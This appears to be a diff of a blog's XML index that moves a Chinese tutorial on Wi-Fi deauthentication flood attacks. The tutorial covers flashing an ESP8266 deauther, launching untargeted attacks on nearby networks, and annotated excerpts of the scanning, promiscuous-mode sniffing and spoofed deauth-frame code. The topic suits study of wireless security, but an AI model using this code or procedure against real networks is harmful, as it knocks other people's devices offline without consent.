-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/4.jpg" class="">
-
-<p>我们连接这个wifi，进入192.168.4.1，可以看到攻击界面，里面会显示当前的AP，我们选取一个作为攻击对象。这里我们设置的是无差别攻击。当我们要定点攻击时，需要扫描连接该WiFi的设备，选择一个攻击。</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/5.jpg" class="">
-
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/6.jpg" class="">
-
-<p>​        选择Deauth攻击，然后我们就可以观察到连接该网的设备断连的现象，手机上方的WiFi图标会不断闪烁。</p>
-<h1 id="代码架构"><a href="#代码架构" class="headerlink" title="代码架构"></a>代码架构</h1><p>首先，WIFI模块有两种工作模式：</p>
-<p>ap是无线发射端，station是接收端，两种模式组建成一个无线局域网。</p>
-<ol>
-<li>ap mode 通常应用在无线局域网成员设备（即客户端）的加入，即<strong>网络下行</strong>。它提供以无线方式组建无线局域网 WLAN，相当际 <strong>WLAN 的中心设备</strong>。AP和AP之间允许相互连接。</li>
-<li>station mode即工作站模式，可以理解为某个网格中的一个工作站即<strong>客户端</strong>，<strong>网络上行</strong>。那当一个 WIFI 芯片提供这个功能时，它就可以连到另外的一个网络当中，如家用路由器。通常用于提供网络的数据上行服务。</li>
-</ol>
-<p>代码的核心是扫描、嗅探和伪造。扫描站点，嗅探（抓包）和通过。</p>
-<p>首先是扫描：</p>
-<p>​    AP模式扫描周围的AP。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line">	<span class="comment">/* AP Scan */</span></span><br><span class="line">    <span class="keyword">if</span> ((mode == SCAN_MODE_APS) || (mode == SCAN_MODE_ALL)) &#123;</span><br><span class="line">        <span class="comment">// remove old results</span></span><br><span class="line">        accesspoints.removeAll();</span><br><span class="line">        stations.removeAll();</span><br><span class="line">        <span class="comment">// start AP scan</span></span><br><span class="line">        prntln(SC_START_AP);</span><br><span class="line">        WiFi.scanNetworks(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">/*该函数可以扫描到ESP8266开发板所在环境中的可用WIFI网络，并且将WiFi网络信息保存到内存中。通过调用SSID、RSSI等函数，我们还可以得到这些扫描到的WIFI的更多信息。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>​    station模式开启后可以开启混杂模式（混杂模式（英语：promiscuous mode）是电脑网络中的术语。是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。），从而为嗅探作准备</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line"><span class="comment">/* Station Scan */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (mode == SCAN_MODE_STATIONS) &#123;</span><br><span class="line">        <span class="comment">// start station scan</span></span><br><span class="line">        <span class="keyword">if</span> (accesspoints.count() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            start(SCAN_MODE_ALL);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="comment">//如果当前网络没有AP,返回重新扫描，因为我们需要先确定攻击的AP再确定攻击的设备，如果在嗅探前AP已经不存在了，则没有继续的必要</span></span><br><span class="line">        snifferStartTime = currentTime;</span><br><span class="line">        prnt(SC_START_CLIENT);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sniffTime &gt; <span class="number">0</span>) prnt(String(sniffTime / <span class="number">1000</span>) + S);</span><br><span class="line">        <span class="keyword">else</span> prnt(SC_INFINITELY);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!channelHop) &#123;</span><br><span class="line">            prnt(SC_ON_CHANNEL);</span><br><span class="line">            prnt(wifi_channel);</span><br><span class="line">        &#125;</span><br><span class="line">        prntln();</span><br><span class="line">        wifi::stopAP();</span><br><span class="line">        wifi_promiscuous_enable(<span class="literal">true</span>);<span class="comment">//开启混杂模式</span></span><br><span class="line">    	<span class="comment">/*混杂模式就是接收所有经过网卡的数据包，包括不是发给本机的包。默认情况下网卡只把发给本机的包（包括广播包）传递给上层程序，其它的包一律丢弃。但是混杂模式就是指网卡能接受所有通过它的数据流，不管是什么格式，什么地址的。事实上，计算机收到数据包后，由网络层进行判断（这里是802.11系协议），确定是递交上层（传输层），还是丢弃，还是递交下层（数据链路层、MAC子层）转发。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>进入嗅探模式：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Scan::sniffer</span><span class="params">(<span class="keyword">uint8_t</span>* buf, <span class="keyword">uint16_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!isSniffing()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    packets++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">28</span>) <span class="keyword">return</span>;  <span class="comment">// 丢弃掉过短的数据包</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0xc0</span>) || (buf[<span class="number">12</span>] == <span class="number">0xa0</span>)) &#123;</span><br><span class="line">        tmpDeauths++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 丢弃信标帧、探测请求/响应和解除授权/解除关联帧</span></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0x80</span>) || (buf[<span class="number">12</span>] == <span class="number">0x40</span>) || (buf[<span class="number">12</span>] == <span class="number">0x50</span>) <span class="comment">/* || buf[12] == 0xc0 || buf[12] == 0xa0*/</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只允许数据帧</span></span><br><span class="line">    <span class="comment">// if(buf[12] != 0x08 &amp;&amp; buf[12] != 0x88) return;数据帧12位为08和88的时候说明是数据帧，如果都不是，可以丢弃，但作者将这句话注释了，不知道原因。。。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>* macTo   = &amp;buf[<span class="number">16</span>];<span class="comment">//该数据包要去哪</span></span><br><span class="line">    <span class="keyword">uint8_t</span>* macFrom = &amp;buf[<span class="number">22</span>];<span class="comment">//该数据包从哪来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (macBroadcast(macTo) || macBroadcast(macFrom) || !macValid(macTo) || !macValid(macFrom) || macMulticast(macTo) ||</span><br><span class="line">        macMulticast(macFrom)) <span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//Broadcast所谓广播地址指同时向网上所有的主机发送报文，也就是说，不管物理网络特性如何，internet网都支持广播传输。这里表示如果收发地址为广播地址，则丢弃。</span></span><br><span class="line">    <span class="comment">//Multicast是一个群组传播模式。。。其他的看不懂了，和上面区别不大。也丢弃。</span></span><br><span class="line">    <span class="comment">//上面两种的特点都是一对多模式，而我们只需要要截获一对一的数据包，并认为该mac为有效mac地址。</span></span><br><span class="line">    <span class="keyword">int</span> accesspointNum = findAccesspoint(macFrom);<span class="comment">//查看该mac地址有几个AP。这个如果为0说明该mac地址是连接AP的设备</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        stations.add(macTo, accesspoints.getID(accesspointNum));</span><br><span class="line">        <span class="comment">//macForm为AP了，那么macTo肯定为设备，我们将该设备的mac加入列表。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  <span class="comment">//如果AP数量为0，那么macTo是AP，macForm为设备，</span></span><br><span class="line">        accesspointNum = findAccesspoint(macTo);</span><br><span class="line">        <span class="comment">//这两个if判断谁是AP谁是设备，写的很垃圾</span></span><br><span class="line">        <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            stations.add(macFrom, accesspoints.getID(accesspointNum));</span><br><span class="line">            <span class="comment">//我们将该设备的mac加入列表。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="802-11协议"><a href="#802-11协议" class="headerlink" title="802.11协议"></a>802.11协议</h2><img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/7.png" class="">
-
-<p>以上是我们需要构造的mac帧头格式</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/8.png" class="">
-
-<p>准确的说，我们需要向设备发送取消验证包。地址1应该是DA（设备mac），地址2是BSSID（伪造成APmac），地址3源地址（还是APmac）</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#attack.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Attack::deauthDevice</span><span class="params">(<span class="keyword">uint8_t</span>* apMac, <span class="keyword">uint8_t</span>* stMac, <span class="keyword">uint8_t</span> reason, <span class="keyword">uint8_t</span> ch)</span> </span>&#123;</span><br><span class="line">	······</span><br><span class="line">    <span class="comment">// build deauth packet</span></span><br><span class="line">    packetSize = <span class="keyword">sizeof</span>(deauthPacket);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> deauthpkt[packetSize];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(deauthpkt, deauthPacket, packetSize);<span class="comment">//构造mac帧头，初始数据见下</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">4</span>], stMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">10</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">16</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    deauthpkt[<span class="number">24</span>] = reason;</span><br><span class="line">    ······</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#attack.h</span></span><br><span class="line"><span class="keyword">uint8_t</span> deauthPacket[<span class="number">26</span>] = &#123;</span><br><span class="line">            <span class="comment">/*  0 - 1  */</span> <span class="number">0xC0</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="comment">/*  2 - 3  */</span> <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">            <span class="comment">/*  4 - 9  */</span> <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="comment">/* 10 - 15 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 16 - 21 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 22 - 23 */</span> <span class="number">0x00</span>, <span class="number">0x00</span>,                         </span><br><span class="line">            <span class="comment">/* 24 - 25 */</span> <span class="number">0x01</span>, <span class="number">0x00</span>                         </span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>软件安全</category>
       </categories>
   </entry>
   <entry>
@@ -1212,6 +1160,58 @@
 ]]></content>
       <categories>
         <category>计算机网络</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>无线DOS之取消验证洪水攻击</title>
+    <url>/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>​    取消验证洪水攻击，全程为De-authenticationFloodAttack,简称为Deauth攻击。首先，攻击者通过扫描周围的WIFI网络，获取WIFI站点的SSID。然后扫描连接周围连接该网络的设备。最后，对周边网络进行抓包（嗅探），寻找要攻击的WIFI站点和连接该站点的设备，以获取的包头信息重新构造一个取消验证包，发给连接设备。设备会被欺骗，从而取消对AP的连接。</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/0.png" class="">
+
+<h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>​    参考已有的张馆长的工程，将其烧录到esp8266模块上。<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1.jpg" class=""></p>
+<p>简单配置一下</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/2.jpg" class="">
+
+<p>烧录</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/3.jpg" class="">
+
+<p>这时，esp8266会建立一个WIFI，</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/4.jpg" class="">
+
+<p>我们连接这个wifi，进入192.168.4.1，可以看到攻击界面，里面会显示当前的AP，我们选取一个作为攻击对象。这里我们设置的是无差别攻击。当我们要定点攻击时，需要扫描连接该WiFi的设备，选择一个攻击。</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/5.jpg" class="">
+
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/6.jpg" class="">
+
+<p>​        选择Deauth攻击，然后我们就可以观察到连接该网的设备断连的现象，手机上方的WiFi图标会不断闪烁。</p>
+<h1 id="代码架构"><a href="#代码架构" class="headerlink" title="代码架构"></a>代码架构</h1><p>首先，WIFI模块有两种工作模式：</p>
+<p>ap是无线发射端，station是接收端，两种模式组建成一个无线局域网。</p>
+<ol>
+<li>ap mode 通常应用在无线局域网成员设备（即客户端）的加入，即<strong>网络下行</strong>。它提供以无线方式组建无线局域网 WLAN，相当际 <strong>WLAN 的中心设备</strong>。AP和AP之间允许相互连接。</li>
+<li>station mode即工作站模式，可以理解为某个网格中的一个工作站即<strong>客户端</strong>，<strong>网络上行</strong>。那当一个 WIFI 芯片提供这个功能时，它就可以连到另外的一个网络当中，如家用路由器。通常用于提供网络的数据上行服务。</li>
+</ol>
+<p>代码的核心是扫描、嗅探和伪造。扫描站点，嗅探（抓包）和通过。</p>
+<p>首先是扫描：</p>
+<p>​    AP模式扫描周围的AP。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line">	<span class="comment">/* AP Scan */</span></span><br><span class="line">    <span class="keyword">if</span> ((mode == SCAN_MODE_APS) || (mode == SCAN_MODE_ALL)) &#123;</span><br><span class="line">        <span class="comment">// remove old results</span></span><br><span class="line">        accesspoints.removeAll();</span><br><span class="line">        stations.removeAll();</span><br><span class="line">        <span class="comment">// start AP scan</span></span><br><span class="line">        prntln(SC_START_AP);</span><br><span class="line">        WiFi.scanNetworks(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">/*该函数可以扫描到ESP8266开发板所在环境中的可用WIFI网络，并且将WiFi网络信息保存到内存中。通过调用SSID、RSSI等函数，我们还可以得到这些扫描到的WIFI的更多信息。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    station模式开启后可以开启混杂模式（混杂模式（英语：promiscuous mode）是电脑网络中的术语。是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。），从而为嗅探作准备</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line"><span class="comment">/* Station Scan */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (mode == SCAN_MODE_STATIONS) &#123;</span><br><span class="line">        <span class="comment">// start station scan</span></span><br><span class="line">        <span class="keyword">if</span> (accesspoints.count() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            start(SCAN_MODE_ALL);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="comment">//如果当前网络没有AP,返回重新扫描，因为我们需要先确定攻击的AP再确定攻击的设备，如果在嗅探前AP已经不存在了，则没有继续的必要</span></span><br><span class="line">        snifferStartTime = currentTime;</span><br><span class="line">        prnt(SC_START_CLIENT);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sniffTime &gt; <span class="number">0</span>) prnt(String(sniffTime / <span class="number">1000</span>) + S);</span><br><span class="line">        <span class="keyword">else</span> prnt(SC_INFINITELY);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!channelHop) &#123;</span><br><span class="line">            prnt(SC_ON_CHANNEL);</span><br><span class="line">            prnt(wifi_channel);</span><br><span class="line">        &#125;</span><br><span class="line">        prntln();</span><br><span class="line">        wifi::stopAP();</span><br><span class="line">        wifi_promiscuous_enable(<span class="literal">true</span>);<span class="comment">//开启混杂模式</span></span><br><span class="line">    	<span class="comment">/*混杂模式就是接收所有经过网卡的数据包，包括不是发给本机的包。默认情况下网卡只把发给本机的包（包括广播包）传递给上层程序，其它的包一律丢弃。但是混杂模式就是指网卡能接受所有通过它的数据流，不管是什么格式，什么地址的。事实上，计算机收到数据包后，由网络层进行判断（这里是802.11系协议），确定是递交上层（传输层），还是丢弃，还是递交下层（数据链路层、MAC子层）转发。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入嗅探模式：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Scan::sniffer</span><span class="params">(<span class="keyword">uint8_t</span>* buf, <span class="keyword">uint16_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!isSniffing()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    packets++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">28</span>) <span class="keyword">return</span>;  <span class="comment">// 丢弃掉过短的数据包</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0xc0</span>) || (buf[<span class="number">12</span>] == <span class="number">0xa0</span>)) &#123;</span><br><span class="line">        tmpDeauths++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 丢弃信标帧、探测请求/响应和解除授权/解除关联帧</span></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0x80</span>) || (buf[<span class="number">12</span>] == <span class="number">0x40</span>) || (buf[<span class="number">12</span>] == <span class="number">0x50</span>) <span class="comment">/* || buf[12] == 0xc0 || buf[12] == 0xa0*/</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只允许数据帧</span></span><br><span class="line">    <span class="comment">// if(buf[12] != 0x08 &amp;&amp; buf[12] != 0x88) return;数据帧12位为08和88的时候说明是数据帧，如果都不是，可以丢弃，但作者将这句话注释了，不知道原因。。。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>* macTo   = &amp;buf[<span class="number">16</span>];<span class="comment">//该数据包要去哪</span></span><br><span class="line">    <span class="keyword">uint8_t</span>* macFrom = &amp;buf[<span class="number">22</span>];<span class="comment">//该数据包从哪来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (macBroadcast(macTo) || macBroadcast(macFrom) || !macValid(macTo) || !macValid(macFrom) || macMulticast(macTo) ||</span><br><span class="line">        macMulticast(macFrom)) <span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//Broadcast所谓广播地址指同时向网上所有的主机发送报文，也就是说，不管物理网络特性如何，internet网都支持广播传输。这里表示如果收发地址为广播地址，则丢弃。</span></span><br><span class="line">    <span class="comment">//Multicast是一个群组传播模式。。。其他的看不懂了，和上面区别不大。也丢弃。</span></span><br><span class="line">    <span class="comment">//上面两种的特点都是一对多模式，而我们只需要要截获一对一的数据包，并认为该mac为有效mac地址。</span></span><br><span class="line">    <span class="keyword">int</span> accesspointNum = findAccesspoint(macFrom);<span class="comment">//查看该mac地址有几个AP。这个如果为0说明该mac地址是连接AP的设备</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        stations.add(macTo, accesspoints.getID(accesspointNum));</span><br><span class="line">        <span class="comment">//macForm为AP了，那么macTo肯定为设备，我们将该设备的mac加入列表。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  <span class="comment">//如果AP数量为0，那么macTo是AP，macForm为设备，</span></span><br><span class="line">        accesspointNum = findAccesspoint(macTo);</span><br><span class="line">        <span class="comment">//这两个if判断谁是AP谁是设备，写的很垃圾</span></span><br><span class="line">        <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            stations.add(macFrom, accesspoints.getID(accesspointNum));</span><br><span class="line">            <span class="comment">//我们将该设备的mac加入列表。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="802-11协议"><a href="#802-11协议" class="headerlink" title="802.11协议"></a>802.11协议</h2><img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/7.png" class="">
+
+<p>以上是我们需要构造的mac帧头格式</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/8.png" class="">
+
+<p>准确的说，我们需要向设备发送取消验证包。地址1应该是DA（设备mac），地址2是BSSID（伪造成APmac），地址3源地址（还是APmac）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#attack.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Attack::deauthDevice</span><span class="params">(<span class="keyword">uint8_t</span>* apMac, <span class="keyword">uint8_t</span>* stMac, <span class="keyword">uint8_t</span> reason, <span class="keyword">uint8_t</span> ch)</span> </span>&#123;</span><br><span class="line">	······</span><br><span class="line">    <span class="comment">// build deauth packet</span></span><br><span class="line">    packetSize = <span class="keyword">sizeof</span>(deauthPacket);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> deauthpkt[packetSize];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(deauthpkt, deauthPacket, packetSize);<span class="comment">//构造mac帧头，初始数据见下</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">4</span>], stMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">10</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">16</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    deauthpkt[<span class="number">24</span>] = reason;</span><br><span class="line">    ······</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#attack.h</span></span><br><span class="line"><span class="keyword">uint8_t</span> deauthPacket[<span class="number">26</span>] = &#123;</span><br><span class="line">            <span class="comment">/*  0 - 1  */</span> <span class="number">0xC0</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="comment">/*  2 - 3  */</span> <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">            <span class="comment">/*  4 - 9  */</span> <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="comment">/* 10 - 15 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 16 - 21 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 22 - 23 */</span> <span class="number">0x00</span>, <span class="number">0x00</span>,                         </span><br><span class="line">            <span class="comment">/* 24 - 25 */</span> <span class="number">0x01</span>, <span class="number">0x00</span>                         </span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>软件安全</category>
       </categories>
   </entry>
   <entry>
